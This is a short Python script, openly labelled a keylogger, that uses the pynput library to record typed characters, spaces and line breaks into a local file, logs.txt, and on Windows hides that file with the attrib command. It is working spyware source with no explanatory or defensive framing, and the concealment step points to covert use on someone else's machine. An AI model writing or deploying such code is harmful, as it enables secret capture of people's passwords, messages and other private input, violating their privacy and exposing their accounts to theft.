from pynput import keyboard
import os

log_file = "logs.txt"

def write_to_file(content):
    with open(log_file, "a") as f:
        f.write(content)

def on_press(key):
    try:
        if key.char:  # Only log printable characters
            write_to_file(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            write_to_file(" ")
        elif key == keyboard.Key.enter:
            write_to_file("\n")
        # Ignore all other special keys

# Start keylogger
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Hide log file (Windows)
if os.name == "nt":
    os.system(f"attrib +h {log_file}")

print("Keylogger running... (Press Ctrl+C to stop manually)")
listener.join()
